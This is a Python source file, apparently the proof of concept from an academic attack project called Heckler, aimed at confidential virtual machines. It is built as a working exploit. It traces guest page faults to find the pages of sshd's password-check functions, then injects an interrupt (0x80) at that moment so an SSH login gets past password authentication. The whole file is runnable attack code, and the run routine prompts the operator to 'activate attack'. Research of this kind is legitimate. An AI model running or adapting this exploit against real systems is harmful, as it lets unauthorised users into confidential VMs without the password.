import os
import random
import threading

from rich.progress import track
from rich.prompt import Confirm, IntPrompt

from heckler.common import dump_entries
from heckler.boot_filter import SshBootFilter

from heckler.vm_controller import VmController
import subprocess as subp
from rich.console import Console
import heckler_bindings as h
from ordered_set import OrderedSet
import time

from heckler.ssh.trace_eval import find_candidates, show_hint

console = Console()
script_dir = os.path.dirname(os.path.realpath(__file__))
vm_run_script = script_dir + "/../../../../run_vm_ssh.sh"
dump_boot_results = script_dir + "/data/boot_results"

_print = print


def print(msg):
    console.print("\[i] ", style="magenta", end="")
    console.print(msg)


# requires go utility: /usr/sbin/my_custom_stuff
class SshConnection:
    UTILITY = 'my_custom_stuff'

    PIPE_TO = "/tmp/pipeToGo"
    PIPE_FROM = "/tmp/pipeFromGo"

    def __init__(self):
        self.ssh_fd_to = -1
        self.ssh_fd_from = -1
        self.process = None

    def prepare(self):
        self.clean_up()

        try:
            os.remove(self.PIPE_TO)
        except OSError as e:
            print(e)
            pass
        try:
            os.remove(self.PIPE_FROM)
        except OSError as e:
            print(e)
            pass

        os.mkfifo(self.PIPE_TO)
        os.mkfifo(self.PIPE_FROM)

        self.process = subp.Popen([self.UTILITY,
                                   'localhost:2222'],
                                  shell=True,
                                  stdout=subp.PIPE,
                                  stdin=subp.PIPE,
                                  stderr=subp.STDOUT)

        self.ssh_fd_to = os.open(self.PIPE_TO, os.O_WRONLY)
        self.ssh_fd_from = os.open(self.PIPE_FROM, os.O_RDONLY)

    def establish_connection_pw_wrong_once(self):
        tmp = os.read(self.ssh_fd_from, 1024)
        tmp = os.write(self.ssh_fd_to, b"\n")
        tmp = os.read(self.ssh_fd_from, 1024)

    def enter_password(self):
        os.write(self.ssh_fd_to, b"\n")
        os.read(self.ssh_fd_from, 1024)

    @staticmethod
    def clean_up():
        cmd = f"pkill -f {SshConnection.UTILITY}"
        subp.call(cmd, shell=True)
        os.system(f'pkill -f {SshConnection.UTILITY}')


class SshAttack:
    def __init__(self):
        self.boot_filter = SshBootFilter(has_booted_cb=self._on_vm_has_booted,
                                         trace=True)
        self.vm_controller = VmController(vm_run_script=vm_run_script,
                                          boot_filter=self.boot_filter)
        self.do_page_tracking = False
        self.do_page_tracking_ready = False
        self.do_page_tracking_stopped = False
        self.pf_analysis = None
        self.vm_booted = False
        self.debugging = False

        # ground truth for eval
        self.page_sshd_auth_password = None
        self.page_sshd_mm_answer_authpassword = None
        pass

    def _on_vm_has_booted(self):
        if not self.vm_booted:
            print("VM has booted")
            self.vm_booted = True
            self.do_page_tracking = False

            self.page_sshd_auth_password = \
                self.boot_filter.page_sshd_auth_password
            self.page_sshd_mm_answer_authpassword = \
                self.boot_filter.page_sshd_mm_answer_authpassword

    def _sleep(self, secs):
        print(f"Sleeping for {secs} seconds...")
        time.sleep(secs)
        print(f"Sleeping done")

    def _dump(self, txt, obj, force=False, time_suffix=True):
        if self.debugging or force:
            dump_entries(txt, obj, time_suffix=time_suffix)

    def _santiy_check(self, set_or_list, name="set", debug=True):
        if self.page_sshd_mm_answer_authpassword not in set_or_list:
            print(f"[red] error: "
                  f"page_sshd_mm_answer_authpassword not found in {name}!")

        if self.page_sshd_auth_password not in set_or_list:
            print(f"[red] error:"
                  f" page_sshd_auth_password not found in {name}!")

        if debug:
            print(f"mm_answer_authpassword in {name}:"
                  f" {set_or_list.count(self.page_sshd_mm_answer_authpassword)}")
            print(f"auth_password in {name}:"
                  f" {set_or_list.count(self.page_sshd_auth_password)}")

    def _kill_utility(self):
        SshConnection.clean_up()

    def _track_once(self, boot,
                    gpa_to_track=None,
                    timeout_s=None,
                    event_timeout=False,
                    wait_before_go=False):
        self.do_page_tracking_ready = False
        self.do_page_tracking_stopped = False
        if wait_before_go:
            self.do_page_tracking = False
        else:
            self.do_page_tracking = True

        run_list = []
        run_set = OrderedSet()
        pfs = {}
        last_gpa = 0

        def th_timeout():
            time.sleep(timeout_s)
            self.do_page_tracking = False

        th = threading.Thread(target=th_timeout, args=[], daemon=True)
        h.heckler_init()

        if timeout_s is not None:
            th.start()

        if boot:
            h.heckler_enable_boot_tracking()
            assert gpa_to_track is None or len(gpa_to_track) == 0
        else:
            h.heckler_enable_tracking()
            h.heckler_untrack_all_pages()
            if gpa_to_track is None or len(gpa_to_track) == 0:
                h.heckler_track_all_pages()
            else:
                for gpa in gpa_to_track:
                    h.heckler_track_page(gpa)
                print(f"marking {len(gpa_to_track)} pages")

        acked = True
        errors = 0

        self.do_page_tracking_ready = True
        if wait_before_go:
            while not self.do_page_tracking:
                pass

        try:
            while self.do_page_tracking:
                acked = False
                if event_timeout:
                    ev = h.heckler_block_until_event_timeout(5)
                else:
                    ev = h.heckler_block_until_event()
                if ev is None or ev.get('ret') == 1 or ev.get('gpa') == 0:
                    if ev is not None:
                        if ev.get('ret') == h.HECKLER_ERR_ABORT:
                            continue
                    errors = errors + 1
                    if errors > 300:
                        print(ev)
                        print(errors)
                        break
                    else:
                        h.heckler_ack_event()
                        acked = True
                        continue
                gpa = int(ev.get('gpa'))
                if gpa not in pfs:
                    pfs[gpa] = 0
                pfs[gpa] += 1
                run_list.append(gpa)
                run_set.add(gpa)
                last_gpa = gpa

                h.heckler_ack_event()
                acked = True
        except Exception as e:
            print(e)
        except KeyboardInterrupt as e:
            print(e)
        if not acked:
            try:
                h.heckler_ack_event()
            except Exception as e:
                print(e)

        self.do_page_tracking_stopped = True
        h.heckler_untrack_all_pages()
        h.heckler_clean_up()

        pf_analysis = {
            'run_list': run_list,
            'run_set': run_set,
            'pfs': pfs,
        }
        self.do_page_tracking = False
        return pf_analysis

    def _track_trace(self,
                     include_gpas,
                     max_hit=None,
                     timeout_s=None,
                     wait_before_go=False):
        self.do_page_tracking_ready = False
        self.do_page_tracking_stopped = False

        if wait_before_go:
            self.do_page_tracking = False
        else:
            self.do_page_tracking = True

        run_list = []
        run_set = OrderedSet()
        has_max_hit = max_hit is not None
        pfs = {}
        last_gpa = 0
        acked = True
        errors = 0

        h.heckler_init()
        h.heckler_enable_tracking()

        def th_timeout():
            nonlocal timeout_s
            time.sleep(timeout_s)
            self.do_page_tracking = False

        th = threading.Thread(target=th_timeout, args=[], daemon=True)
        for gpa in include_gpas:
            h.heckler_track_page(gpa)

        if timeout_s is not None:
            th.start()

        try:
            self.do_page_tracking_ready = True
            if wait_before_go:
                while not self.do_page_tracking:
                    pass
            while self.do_page_tracking:
                acked = False
                ev = h.heckler_block_until_event()
                if ev is None or ev.get('ret') == 1 or ev.get('gpa') == 0:
                    errors = errors + 1
                    if errors > 300:
                        print(ev)
                        print(errors)
                        break
                    else:
                        h.heckler_ack_event()
                        acked = True
                        continue

                gpa = int(ev.get('gpa'))

                if gpa not in pfs:
                    pfs[gpa] = 0

                pfs[gpa] += 1
                run_list.append(gpa)
                run_set.add(gpa)

                if last_gpa != gpa and last_gpa != 0 \
                        and (not has_max_hit or pfs[last_gpa] < max_hit):
                    h.heckler_track_page(last_gpa)
                last_gpa = gpa

                h.heckler_ack_event()
                acked = True
        except Exception as e:
            print(e)
        except KeyboardInterrupt as e:
            print(e)
        if not acked:
            try:
                h.heckler_ack_event()
            except Exception as e:
                print(e)

        h.heckler_ack_event()
        self.do_page_tracking_stopped = True
        h.heckler_untrack_all_pages()
        h.heckler_clean_up()

        pf_analysis = {
            'run_list': run_list,
            'run_set': run_set,
            'pfs': pfs,
        }
        self.do_page_tracking = False
        return pf_analysis

    def _do_profile(self,
                    do_trace,
                    include_set=None,
                    max_hit=None):
        self._kill_utility()
        ssh_conn = SshConnection()
        ssh_conn.prepare()
        ssh_conn.establish_connection_pw_wrong_once()

        def do_handshake(self):
            nonlocal ssh_conn
            while not self.do_page_tracking_ready:
                pass

            print("Doing ssh login...")
            self.do_page_tracking = True
            ssh_conn.enter_password()
            self.do_page_tracking = False

        th_ssh_conn = threading.Thread(target=do_handshake,
                                       args=[self],
                                       daemon=False)
        th_ssh_conn.start()

        if do_trace:
            res = self._track_trace(include_set,
                                    max_hit=max_hit,
                                    wait_before_go=True)
        else:
            res = self._track_once(boot=False,
                                   gpa_to_track=include_set,
                                   event_timeout=False,
                                   wait_before_go=True)

        print("Waiting for tracking thread to join() (hit ctrl-c to quit)")
        th_ssh_conn.join()
        return res

    def _do_trace(self,
                  include_set,
                  max_hit=30):
        trace_results = self._do_profile(True, include_set=include_set, max_hit=max_hit)
        self._kill_utility()

        run_list = trace_results['run_list']
        run_set = trace_results['run_set']
        self._dump('trace_results', trace_results)

        return run_list, run_set

    def _filter_candidates(self,
                           new_candidates,
                           prev_candidates,
                           run_list,
                           debug=False):
        if len(prev_candidates) == 0:
            return new_candidates

        if debug:
            print("previous candidates:")
            show_hint(prev_candidates,
                      run_list=run_list,
                      gt_auth_password=self.page_sshd_auth_password,
                      gt_mm_answer_authpassword=self.page_sshd_mm_answer_authpassword,
                      debug=debug)

        if debug:
            print("new candidates:")
            show_hint(new_candidates,
                      run_list=run_list,
                      gt_auth_password=self.page_sshd_auth_password,
                      gt_mm_answer_authpassword=self.page_sshd_mm_answer_authpassword,
                      debug=debug)

        candidates = []
        for c in new_candidates:
            if c in prev_candidates:
                candidates.append(c)

        if debug:
            print("new candidate set (merged)")

        show_hint(candidates,
                  run_list=run_list,
                  gt_auth_password=self.page_sshd_auth_password,
                  gt_mm_answer_authpassword=self.page_sshd_mm_answer_authpassword,
                  debug=debug)

        return candidates

    def boot(self):
        self.vm_controller.launch(daemon=True, verbose=True)
        boot_results = self._track_once(boot=True)
        boot_set = boot_results['run_set']
        self._dump('boot_results', boot_results)
        return boot_set

    def profile(self, include_set=None):
        track_once_results = self._do_profile(False, include_set=include_set)
        run_set = track_once_results['run_set']
        self._dump('track_once_results', track_once_results)
        return run_set

    def trace(self, total_include_set, index=0):
        trace_list, run_set = self._do_trace(total_include_set)
        self._santiy_check(trace_list, "application trace")

        self._dump(f"trace_list_{index}", trace_list, force=False)
        self._dump("run_set_latest", trace_list, force=False, time_suffix=False)
        self._dump("ground_truth",
                   {'mm_answer_authpassword': self.page_sshd_mm_answer_authpassword,
                    'auth_password': self.page_sshd_auth_password}, force=True)

        return trace_list, run_set

    def inject(self, gadget_pairs, quit_after_one_inject=True):
        """
        gadget_pairs: (mm_answer_authpassword, auth_password)
        """
        self.do_page_tracking = True

        lastlast_gpa = 0
        last_gpa = 0
        h.heckler_init()

        h.heckler_enable_tracking()
        h.heckler_untrack_all_pages()

        for gadgets in gadget_pairs:
            gad1 = gadgets[0]
            gad2 = gadgets[1]
            h.heckler_track_page(gad1)
            h.heckler_track_page(gad2)

        history = {}
        print("Attack active. Waiting for target gadgets...")

        acked = True
        errors = 0
        try:
            while self.do_page_tracking:
                acked = False
                ev = h.heckler_block_until_event()
                if ev is None or ev.get('ret') == 1 or ev.get('gpa') == 0:
                    if ev is not None:
                        if ev.get('ret') == h.HECKLER_ERR_ABORT:
                            continue
                    errors = errors + 1
                    if errors > 300:
                        print(ev)
                        print(errors)
                        break
                    else:
                        h.heckler_ack_event()
                        acked = True
                        continue

                gpa = int(ev.get('gpa'))

                track_again = True

                if lastlast_gpa != 0 and last_gpa != 0 and gpa != 0:
                    key = (lastlast_gpa, last_gpa, gpa)
                    if key not in history:
                        history[key] = 0

                    history[key] += 1

                    if history[key] > 3:
                        track_again = False

                print(f"sequence \[{hex(lastlast_gpa)}, {hex(last_gpa)}, {hex(gpa)}]")

                for gadgets in gadget_pairs:
                    mm_answer_authpassword = gadgets[0]
                    auth_password = gadgets[1]

                    # sequence of interest:
                    # mm_answer_authpassword -> auth_password -> mm_answer_authpassword
                    if gpa == mm_answer_authpassword \
                            and last_gpa == auth_password \
                            and lastlast_gpa == mm_answer_authpassword:
                        print(f"Injecting interrupt, sequence "
                              f"\[{hex(lastlast_gpa)}, {hex(last_gpa)}, {hex(gpa)}]")
                        h.heckler_inject(0x80)
                        if quit_after_one_inject:
                            self.do_page_tracking = False
                            break

                if last_gpa != gpa and last_gpa != 0:
                    if track_again:
                        h.heckler_track_page(last_gpa)

                lastlast_gpa = last_gpa
                last_gpa = gpa
                h.heckler_ack_event()
                acked = True

        except Exception as e:
            print(e)
        except KeyboardInterrupt as e:
            print(e)
        if not acked:
            try:
                h.heckler_ack_event()
            except Exception as e:
                print(e)
        h.heckler_untrack_all_pages()
        h.heckler_clean_up()
        self.do_page_tracking = False
        pass

    def run(self, trace=False, debugging=False):
        total_include_set = OrderedSet()
        total_exclude_set = OrderedSet()

        #
        # Boot set
        #
        console.rule("Profiling Boot (S_Boot)")
        boot_set = self.boot()
        total_exclude_set.update(boot_set)

        print(f"Collected {len(boot_set)} page faults during boot "
              f"\[include: {len(total_include_set)},"
              f" exclude: {len(total_exclude_set)}]")
        self._sleep(5)

        #
        # Idle Execution
        #
        console.rule(f"Profiling idle execution")
        for i in range(2):
            print(f"Profiling {i}...")
            exclude = self._track_once(boot=False, timeout_s=5)
            exclude_set = exclude['run_set']
            total_exclude_set.update(exclude_set)

            print(f"Collected {len(exclude_set)} page faults during idle execution"
                  f" \[include: {len(total_include_set)},"
                  f" exclude: {len(total_exclude_set)}]")
            self._sleep(1)

        #
        # Application Set
        #
        try:
            for i in range(2):
                print(f"Profiling ssh login attempt {i + 1} (S_App)")
                include_set = self.profile(total_include_set)

                if len(total_include_set) == 0:
                    total_include_set.update(include_set)
                    total_include_set.difference_update(total_exclude_set)
                else:
                    total_include_set.intersection_update(include_set)
                    total_include_set.difference_update(total_exclude_set)

                print(f"Collected {len(include_set)} page faults"
                      f" \[include: {len(total_include_set)},"
                      f" exclude: {len(total_exclude_set)}]")
                self._sleep(1)
        except KeyboardInterrupt as e:
            pass

        #
        # Application Trace
        #
        candidates = []
        try:
            for i in range(2):
                console.rule(f"Profiling application trace ({i})"
                             f"(PT_App with |S_App|={len(total_include_set)})")
                self._sleep(3)

                run_list, run_set = self.trace(total_include_set, i)
                print(f"Collected trace of {len(run_list)} pages (PT_App)")

                new_candidates = find_candidates(run_list,
                                                 run_set,
                                                 self.page_sshd_auth_password,
                                                 self.page_sshd_mm_answer_authpassword,
                                                 debug=False)

                candidates = self._filter_candidates(new_candidates,
                                                     candidates,
                                                     run_list,
                                                     debug=False)

                if len(candidates) == 1:
                    break

        except KeyboardInterrupt as e:
            pass

        #
        # injection
        #
        if len(candidates) == 1:
            print("Gadget unique identified")

        if len(candidates) > 0:
            try:
                console.rule(f"Attack")
                print("Pick a gadget for injection: ")
                show_hint(candidates,
                          [],
                          self.page_sshd_auth_password,
                          self.page_sshd_mm_answer_authpassword,
                          debug=False)

                choices = [str(r) for r in range(len(candidates) + 1)]
                res = IntPrompt.ask(f"Type number (1 - {len(candidates)}) or 0 for all."
                                    f" Ctrl-d to abort", choices=choices)

                inj_candidates = candidates
                if res > 0:
                    inj_candidates = [candidates[res - 1]]
                print(inj_candidates)

                print("Type SSH into CVM to bypass authentication. Type non empty password")
                Confirm.ask("Press enter key to activate attack...", choices=[''])
                self.inject(inj_candidates)
            except KeyboardInterrupt as e:
                print("Abort.")
                pass
        print("Done")


def __inject_test():
    addrs = []
    addr1 = 0x14445000
    addr2 = 0x15f3d000
    addr1 = addr1 // 4096 * 4096
    addr2 = addr2 // 4096 * 4096
    addrs.append((addr1, addr2))

    addr1 = 0x13c8b000
    addr2 = 0x151fc000
    addr1 = addr1 // 4096 * 4096
    addr2 = addr2 // 4096 * 4096
    addrs.append((addr1, addr2))
    SshAttack().inject(addrs)


if __name__ == '__main__':
    SshAttack().run()
    # __inject_test()
